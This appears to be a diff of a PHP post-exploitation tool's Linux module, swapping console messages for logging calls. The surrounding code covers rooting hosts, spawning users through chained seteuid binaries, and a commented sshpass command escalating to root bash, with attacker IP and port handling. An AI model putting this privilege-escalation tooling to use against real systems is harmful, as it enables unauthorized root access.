@@ -61,7 +61,7 @@ class lan4linux extends LAN{
         $this->lan2where = "id8port = '$this->port2id' AND uid_name = '$this->uid_name' AND templateB64_id = '$this->templateB64_id' AND templateB64_cmd = '$this->templateB64_cmd' AND uid = '$uid' AND gid = '$gid' AND gid_name = '$gid_name' AND context = '$context' ";
         
         
-        if (empty($this->uid_name)) {$this->rouge("Empty USERNAME");exit();}
+        if (empty($this->uid_name)) {$this->log2error("Empty USERNAME",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","LAN");exit();}
         
         if ($this->context !== "listening_Server" ){
             $sql_r = "SELECT templateB64_id FROM LAN WHERE $this->lan2where ORDER BY ladate DESC LIMIT 1 ";           
@@ -354,8 +354,8 @@ This can also be used to determine local IPs, as well as gain a better understan
         // echo id | sshpass -p 'password' ssh user@10.60.10.131 -p 22 -C  "/tmp/seteuid_user_user2_bash \"/tmp/seteuid_user2_user3_bash \\\"/tmp/seteuid_user3_root_bash \"/bin/bash\" \\\" \" "
         
         $this->titre(__FUNCTION__);
-        if ($this->ip2root8db($this->ip2id)) return $this->rouge("IP already rooted");
-        if (!strstr($template_id_euid, "%ID%")) return $this->rouge("There is NO %ID% into Template:$template_id_euid");
+        if ($this->ip2root8db($this->ip2id)) return $this->log2succes("IP already rooted",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
+        if (!strstr($template_id_euid, "%ID%")) return $this->log2error("There is NO %ID% into Template:$template_id_euid",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
         $template_id = $template_id_euid;
         $templateB64_id = trim(base64_encode($template_id));
         $euid = "";
@@ -385,7 +385,7 @@ This can also be used to determine local IPs, as well as gain a better understan
             
             if ( (empty($euid_name)) && ($uid_name !== $this->uid_name) ){
                 $this->article("Old UID NAME", $this->uid_name);
-                $this->rouge("check new USER:$uid_name");$this->pause();
+                $this->log2succes("check new USER:$uid_name",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");$this->pause();
                 $template_cmd2 = str_replace("%SHELL%",addcslashes($template_id,'"'),$this->template_shell);
                 $template_cmd = str_replace("%ID%","%CMD%",$template_cmd2);
                 $templateB64_cmd = base64_encode($template_cmd);
@@ -442,7 +442,7 @@ This can also be used to determine local IPs, as well as gain a better understan
             if ($this->uid_name !== $obj_lan_root->uid_name){   
                 
                 $chaine = "spawning $obj_lan_root->uid_name";
-                $this->notify($chaine);
+                $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                 
 
                 $this->pause();
@@ -452,14 +452,14 @@ This can also be used to determine local IPs, as well as gain a better understan
 
                 
                 if ($this->lan2root4check8id($cmd_id,$obj_lan_root->templateB64_id)) {
-                    $this->rouge("Yes RooT running infos");
+                    $this->log2succes("Yes RooT running infos",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                     
                     $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
 
                 }
                 else {
                     
-                    $this->rouge("$obj_lan_root->uid_name is not root checking again");
+                    $this->log2succes("$obj_lan_root->uid_name is not root checking again",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                     $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                     /*
                     $attacker_ip = $this->ip4addr4target($this->ip);
@@ -551,7 +551,7 @@ EOC;
                 
                 if ($this->uid_name !== $username_found){
                     $chaine = "yes USER:$username_found spawned via USER:$this->uid_name";
-                    $this->notify($chaine);
+                    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
 
                     
                     $seteuid = <<<EOC
@@ -591,7 +591,7 @@ EOC;
                     if ( !empty($new_username_found) ){
                         if ( $new_username_found===$username_found ){
                             $chaine = "Succes Spawn $username_found";
-                            $this->notify($chaine);
+                            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                             
                             $new_templateB64_id = "$file_bash_name %ID%";
                             $this->article("New TEMPLATE B64", $new_templateB64_id);
@@ -821,14 +821,14 @@ public function lan2root4check8id($data,$infos_base64){
 
     $impass = "must be run from a terminal";
     if (empty($data)){
-        $this->rouge("Empty DATA");       
+        $this->log2error("Empty DATA",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");       
         return FALSE;
     }
     $check = $this->lan2stream4result($data,$this->stream_timeout*2.5);
     //var_dump($check);
     if (stristr($check,$impass)){
         //$this->notify("$this->ip:$this->port:$this->protocol:$impass:$data:$infos");
-        $this->rouge($impass);
+        $this->log2error($impass,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
         
         return FALSE;
     }
